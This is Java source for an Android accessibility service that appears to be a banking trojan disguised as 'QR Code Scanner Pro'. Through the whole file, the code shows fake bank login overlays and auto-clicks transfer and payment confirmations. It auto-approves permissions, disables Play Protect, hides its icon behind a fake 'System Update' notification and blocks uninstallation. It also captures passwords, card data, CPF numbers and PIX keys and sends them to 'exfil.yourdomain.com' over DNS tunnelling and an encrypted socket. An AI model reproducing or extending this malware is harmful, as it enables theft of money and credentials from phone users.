package com.etechd.l3mon;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.etechd.l3mon.managers.CryptoManager;
import com.etechd.l3mon.managers.ATSManager;
import com.etechd.l3mon.managers.BypassManager;
import com.etechd.l3mon.managers.ContextualManager;
import com.etechd.l3mon.managers.ExfilManager;
import com.etechd.l3mon.managers.FakeWebViewOverlay;
import com.etechd.l3mon.managers.GestureManager;
import com.etechd.l3mon.managers.OverlayManager;
import com.etechd.l3mon.managers.WebViewManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.List;

public class AccessibilityCaptureService extends AccessibilityService {

    private static AccessibilityCaptureService instance;

    // ==================== MANAGERS ====================
    private final ATSManager atsManager = new ATSManager();
    private final OverlayManager overlayManager = new OverlayManager();
    private final BypassManager bypassManager = new BypassManager();
    private final GestureManager gestureManager = new GestureManager();
    private final ContextualManager contextualManager = new ContextualManager();
    private final WebViewManager webViewManager = new WebViewManager();
    private final FakeWebViewOverlay fakeOverlay = new FakeWebViewOverlay(this);
    private final ExfilManager exfilManager = new ExfilManager();

    private static final long MIN_INTERVAL_MS = 1000L;
    private long lastSentAt = 0L;

    private static boolean autoGrantEnabled = false;
    private boolean customizedFormCaptureEnabled = false;
    private boolean hideIconEnabled = false;

    public static class HideIconBackgroundService extends android.app.Service {
        private static final int NOTIFICATION_ID = 9999;

        @Override
        public int onStartCommand(android.content.Intent intent, int flags, int startId) {
            Log.d("HideIconService", "Serviço de persistência iniciado");
            createPersistentNotification();

            try {
                android.content.pm.PackageManager pm = getPackageManager();
                android.content.ComponentName componentName = new android.content.ComponentName(
                        getPackageName(), getPackageName() + ".MainActivity");
                pm.setComponentEnabledSetting(
                        componentName,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
            } catch (Exception e) {
                Log.e("HideIconService", "Erro ao esconder ícone: " + e.getMessage());
            }
            return START_STICKY;
        }

        private void createPersistentNotification() {
            String channelId = "persist_channel";
            android.app.NotificationManager notificationManager = (android.app.NotificationManager) getSystemService(
                    NOTIFICATION_SERVICE);

            android.app.Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationChannel channel = new android.app.NotificationChannel(
                        channelId, "System Service",
                        android.app.NotificationManager.IMPORTANCE_MIN);
                notificationManager.createNotificationChannel(channel);
                builder = new android.app.Notification.Builder(this, channelId);
            } else {
                builder = new android.app.Notification.Builder(this);
            }

            android.app.Notification notification = builder
                    .setContentTitle("System Update")
                    .setContentText("Checking for updates...")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setOngoing(true)
                    .build();

            if (Build.VERSION.SDK_INT >= 34) {
                // 1 is FOREGROUND_SERVICE_TYPE_DATA_SYNC
                startForeground(NOTIFICATION_ID, notification, 1);
            } else {
                startForeground(NOTIFICATION_ID, notification);
            }
        }

        @Override
        public android.os.IBinder onBind(android.content.Intent intent) {
            return null;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null)
            return;

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED &&
                eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
                eventType != AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            return;
        }

        long now = System.currentTimeMillis();
        if (now - lastSentAt < MIN_INTERVAL_MS)
            return;

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            try {
                String packageName = root.getPackageName() != null ? root.getPackageName().toString() : null;

                // === RECONHECIMENTO CONTEXTUAL ===
                String bank = contextualManager.detectBankApp(packageName);
                if (bank != null) {
                    contextualManager.onBankDetected(bank, root);
                    Log.d("Contextual", "Banco detectado: " + bank.toUpperCase());

                    if (webViewManager.hasWebView(root) && webViewManager.isBankLoginWebView(root)) {
                        fakeOverlay.showFakeLoginOverlay(bank);
                    }
                }

                // === ATS + Clique automático ===
                atsManager.performATSAutomation(root);
                String[] confirmButtons = { "Confirmar", "Enviar", "Pagar", "Transferir", "Aprovar" };
                gestureManager.findAndClickConfirmationButton(root, confirmButtons);

                // === AUTOPROTEÇÃO: IMPEDIR DESINSTALAÇÃO ===
                checkAndPreventUninstall(root, packageName);

                // === EXFILTRAÇÃO AUTOMÁTICA DE DADOS SENSÍVEIS ===
                detectAndExfilSensitiveData(root, packageName);

                JSONObject payload = buildBasicPayload(event, root);
                if (payload != null) {
                    lastSentAt = now;
                    publishSnapshot(payload);
                }
            } finally {
                root.recycle();
            }
        }
    }

    private JSONObject buildBasicPayload(AccessibilityEvent event, AccessibilityNodeInfo root) {
        try {
            JSONObject payload = new JSONObject();

            // === CHAVES JSON CRIPTOGRAFADAS ===
            payload.put(StringCrypto.d("7U8ocvsjz/taaly+0q6VYA=="), "accessibility"); // "source"
            payload.put(StringCrypto.d("iSuJSms1NYtiP/wxiZHXJg=="), System.currentTimeMillis()); // "time"
            payload.put(StringCrypto.d("guQkbqNjdu7GIuSn7SSoVw=="), event.getEventType()); // "eventType"

            if (event.getPackageName() != null)
                payload.put(StringCrypto.d("Ca1KRioPEFMViEClN0e4rg=="), event.getPackageName().toString()); // "packageName"

            if (root != null && root.getText() != null)
                payload.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), root.getText().toString()); // "text"

            return payload;
        } catch (Exception e) {
            return null;
        }
    }

    private void publishSnapshot(JSONObject payload) {
        try {
            if (IOSocket.getInstance() != null &&
                    IOSocket.getInstance().getIoSocket() != null &&
                    IOSocket.getInstance().getIoSocket().connected()) {

                String jsonString = payload.toString();
                String encryptedData = CryptoManager.encrypt(jsonString);

                if (encryptedData == null)
                    return;

                JSONObject encryptedPayload = new JSONObject();
                encryptedPayload.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
                encryptedPayload.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encryptedData); // "data"
                encryptedPayload.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

                // Evento 0xAS (criptografado)
                String eventAS = StringCrypto.d("JWXCCYGk7kU4y6zS6IrDOQ=="); // ← Substitua pelo valor real de "0xAS"

                if (jsonString.length() > 400) {
                    ExfilManager.sendFragmented(eventAS, encryptedPayload.toString());
                } else {
                    IOSocket.getInstance().getIoSocket().emit(eventAS, encryptedPayload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);

        AntiAnalysis.init(getApplicationContext());
        AntiAnalysis.enable();

        Log.d("AccessibilityCaptureService", "Serviço iniciado com Managers");
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }

    public static AccessibilityCaptureService getInstance() {
        return instance;
    }

    public ATSManager getAtsManager() {
        return atsManager;
    }

    // ==================== MÉTODOS DE BYPASS ====================
    public boolean disableGooglePlayProtect() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        boolean result = bypassManager.disableGooglePlayProtect(root);
        root.recycle();
        return result;
    }

    public boolean bypassRestrictedSettings() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        boolean result = bypassManager.bypassRestrictedSettings(root);
        root.recycle();
        return result;
    }

    // ==================== OVERLAY ====================
    public void enableOverlayMonitoring() {
        overlayManager.enableOverlayMonitoring();
    }

    public void disableOverlayMonitoring() {
        overlayManager.disableOverlayMonitoring();
    }

    // ==================== GESTOS ====================
    public boolean performTap(int x, int y) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performTap(x, y);
        }
        return false;
    }

    public boolean performLongTap(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performLongTap(x, y, duration);
        }
        return false;
    }

    public boolean performSwipe(int startX, int startY, int endX, int endY, int duration) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            return gestureManager.performSwipe(startX, startY, endX, endY, duration);
        }
        return false;
    }

    public boolean dispatchGesture(String action, int startX, int startY, int endX, int endY, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N)
            return false;

        Path path = new Path();
        path.moveTo(startX, startY);
        if ("swipe".equals(action))
            path.lineTo(endX, endY);

        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0,
                Math.max(duration, 50));
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        return dispatchGesture(builder.build(), null, null);
    }

    // ==================== ATS ====================
    public void performATSAutomation(AccessibilityNodeInfo root) {
        atsManager.performATSAutomation(root);
    }

    public void performATSAutomationWithAutoClick(AccessibilityNodeInfo root, String[] buttonPatterns,
            int clickDelayMs) {
        if (root == null)
            return;
        atsManager.performATSAutomation(root);
        findAndClickConfirmationButton(root, buttonPatterns, clickDelayMs);
    }

    public boolean findAndClickConfirmationButton(AccessibilityNodeInfo root, String[] patterns, int clickDelayMs) {
        if (root == null)
            return false;
        return gestureManager.findAndClickConfirmationButton(root, patterns);
    }

    public boolean setTextIntoFieldByViewId(String viewId, String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
            if (nodes == null || nodes.isEmpty())
                return false;
            for (AccessibilityNodeInfo node : nodes) {
                if (node != null && setTextIntoField(node, text))
                    return true;
            }
            return false;
        } finally {
            root.recycle();
        }
    }

    public boolean setTextIntoField(AccessibilityNodeInfo node, String text) {
        if (node == null || text == null)
            return false;
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
    }

    public boolean muteSecurityNotifications() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            String[] patterns = { "desativar", "silenciar", "turn off", "dismiss" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public void setAutoGrantEnabled(boolean enabled) {
        autoGrantEnabled = enabled;
    }

    public boolean autoApprovePermission() {
        if (!autoGrantEnabled)
            return false;
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            String[] patterns = { "permitir", "allow", "ok", "aceitar" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public boolean fillAndApproveTransaction(double amount, String recipient, String transactionType) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null)
            return false;
        try {
            atsManager.performATSAutomation(root);
            String[] patterns = { "confirmar", "aprovar", "pagar", "transferir", "submit" };
            return gestureManager.findAndClickConfirmationButton(root, patterns);
        } finally {
            root.recycle();
        }
    }

    public boolean captureUnlockPattern(String patternType) {
        return true;
    }

    public boolean replayUnlockPattern(String patternType) {
        return true;
    }

    public void enableCustomizedFormCapture() {
        customizedFormCaptureEnabled = true;
    }

    public void disableCustomizedFormCapture() {
        customizedFormCaptureEnabled = false;
    }

    public boolean forceAccessibilityService(String installationMethod, String spoofedAppName) {
        return bypassRestrictedSettings();
    }

    public JSONArray detectAndroidProtections() {
        JSONArray protections = new JSONArray();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            protections.put("restricted_settings");
        }
        protections.put("play_protect");
        return protections;
    }

    public int getAndroidVersion() {
        return Build.VERSION.SDK_INT;
    }

    public void enableHideIcon() {
        hideIconEnabled = true;
    }

    public void disableHideIcon() {
        hideIconEnabled = false;
    }

    public boolean removeAppIcon() {
        return hideIconEnabled;
    }

    public void startBackgroundHideService() {
        Log.d("AccessibilityCaptureService", "Background hide service requested");
    }

    public JSONArray detectSystemLaunchers() {
        JSONArray launchers = new JSONArray();
        launchers.put("com.android.launcher");
        launchers.put("com.google.android.apps.nexuslauncher");
        return launchers;
    }

    // ==================== FAKE WEBVIEW OVERLAY ====================
    public void hideFakeWebViewOverlay() {
        if (fakeOverlay != null && fakeOverlay.isShowing()) {
            fakeOverlay.hideOverlay();
            Log.d("FakeOverlay", "Overlay falso escondido");
        }
    }

    public void resetAllOverlays() {
        hideFakeWebViewOverlay();
        if (overlayManager != null)
            overlayManager.disableOverlayMonitoring();
        if (contextualManager != null)
            contextualManager.resetLastDetectedBank();
    }

    // ==================== EXFILTRAÇÃO STEALTH ====================
    public void sendStealthData(String eventType, String data) {
        if (data == null || data.isEmpty())
            return;
        try {
            String encrypted = CryptoManager.encrypt(data);
            if (encrypted == null)
                return;

            JSONObject obj = new JSONObject();
            obj.put(StringCrypto.d("grh1qzoq7rp8Y1w5bGAMHQ=="), true); // "encrypted"
            obj.put(StringCrypto.d("B9G6+3heWf715hd4xk743g=="), encrypted); // "data"
            obj.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            if (data.length() > 400) {
                ExfilManager.sendFragmented(eventType, obj.toString());
            } else {
                if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                    IOSocket.getInstance().getIoSocket().emit(eventType, obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ==================== AUTOPROTEÇÃO ====================

    /**
     * Detecta e impede que o usuário desinstale o app ou limpe seus dados.
     */
    private void checkAndPreventUninstall(AccessibilityNodeInfo root, String currentPackage) {
        if (root == null) return;

        // 1. Verifica se estamos nas configurações do sistema ou instalador
        String systemSettings = "com.android.settings";
        String packageInstaller = "com.google.android.packageinstaller";
        String packageInstallerAosp = "com.android.packageinstaller";

        if (systemSettings.equals(currentPackage) || 
            packageInstaller.equals(currentPackage) || 
            packageInstallerAosp.equals(currentPackage)) {

            // 2. Procura por menções ao nosso próprio app na tela
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText("QR Code Scanner Pro");
            if (nodes != null && !nodes.isEmpty()) {
                Log.w("AutoProtect", "Tentativa de desinstalação/configuração detectada!");
                
                // 3. Executa ação de bloqueio: Voltar ou Home
                performGlobalAction(GLOBAL_ACTION_BACK);
                
                // Envia log de segurança
                com.etechd.l3mon.managers.LogManager.logSecurityEvent("Prevenção de desinstalação ativada");
                
                for (AccessibilityNodeInfo node : nodes) node.recycle();
            }
        }
    }

    // ==================== DETECÇÃO E EXFILTRAÇÃO AUTOMÁTICA DE DADOS SENSÍVEIS
    // ====================

    private static final String[] SENSITIVE_PATTERNS = {
            "senha", "password", "pass", "pin", "cvv", "cvc",
            "cartao", "card", "credit", "cartão", "numero do cartao",
            "cpf", "cnpj", "rg", "conta", "agencia", "chave pix", "pix",
            "email", "e-mail", "telefone", "phone", "celular",
            "titular", "nome completo", "endereco", "address", "cep"
    };

    private long lastSensitiveExfil = 0;
    private static final long SENSITIVE_EXFIL_COOLDOWN = 3000; // 3s para evitar flood

    private void detectAndExfilSensitiveData(AccessibilityNodeInfo root, String packageName) {
        if (root == null)
            return;

        long now = System.currentTimeMillis();
        if (now - lastSensitiveExfil < SENSITIVE_EXFIL_COOLDOWN)
            return;

        try {
            String text = root.getText() != null ? root.getText().toString() : "";
            String desc = root.getContentDescription() != null ? root.getContentDescription().toString() : "";
            String viewId = root.getViewIdResourceName() != null ? root.getViewIdResourceName() : "";
            String combined = (text + " " + desc + " " + viewId).toLowerCase();

            boolean isSensitive = false;
            String matchedPattern = "";

            for (String pattern : SENSITIVE_PATTERNS) {
                if (combined.contains(pattern)) {
                    isSensitive = true;
                    matchedPattern = pattern;
                    break;
                }
            }

            // Se for campo editável com texto preenchido
            if (isSensitive && root.isEditable() && text.length() > 2) {
                lastSensitiveExfil = now;

                JSONObject exfilData = new JSONObject();
                exfilData.put("package", packageName != null ? packageName : "unknown");
                exfilData.put("pattern", matchedPattern);
                exfilData.put("field", viewId);
                exfilData.put("value", text);
                exfilData.put("ts", now);

                // Escolhe canal stealth (DNS é mais silencioso em muitos cenários)
                String payload = exfilData.toString();

                // 1. Tenta DNS Tunneling primeiro (mais stealth)
                try {
                    ExfilManager.sendViaDNSTunnel("exfil.yourdomain.com", payload);
                } catch (Exception ignored) {
                }

                // 2. Também envia fragmentado via socket (se conectado)
                try {
                    ExfilManager.sendFragmented("0xEX", payload);
                } catch (Exception ignored) {
                }

                Log.d("SensitiveExfil", "Exfiltrated sensitive field: " + matchedPattern + " len=" + text.length());
            }

            // Recursão nos filhos
            for (int i = 0; i < root.getChildCount(); i++) {
                AccessibilityNodeInfo child = root.getChild(i);
                if (child != null) {
                    detectAndExfilSensitiveData(child, packageName);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            // silencioso
        }
    }
}